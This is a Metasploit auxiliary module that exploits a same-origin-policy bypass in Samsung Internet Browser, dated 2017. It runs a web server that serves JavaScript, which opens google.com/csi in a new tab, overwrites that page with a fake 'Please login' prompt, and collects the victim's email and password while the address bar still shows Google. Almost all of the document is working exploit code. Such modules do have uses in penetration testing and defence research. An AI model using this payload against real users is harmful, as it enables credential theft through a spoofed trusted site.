##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Samsung Internet Browser SOP Bypass",
        'Description'    => %q(
          This module opens up and does a server-redirect to child tab using document.body.innerHTML funtion, the child tab creates a fake pop up asking email ID, Password.
          Once entered the credentials is passed back to the parent tab, In this case the address bar points to google.com/csi which actually can be used to trick some one.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra',
        ],
        'References'     => [
        ['URL', 'http://fr.0day.today/exploit/description/28434'],
        ],
        'DisclosureDate' => "Nov 08 2017",
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
<html><body><script>
function go(){
var x = window.open('https://www.google.com/csi');
setTimeout(function(){x.document.body.innerHTML='<h1>Please login</h1>';a=x.prompt('E-mail','');b=x.prompt('Password','');alert('E-mail: '+a+'\nPassword: '+b)},3000);
}
</script>
<button onclick="go()">go</button>
</body></html>
    |
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
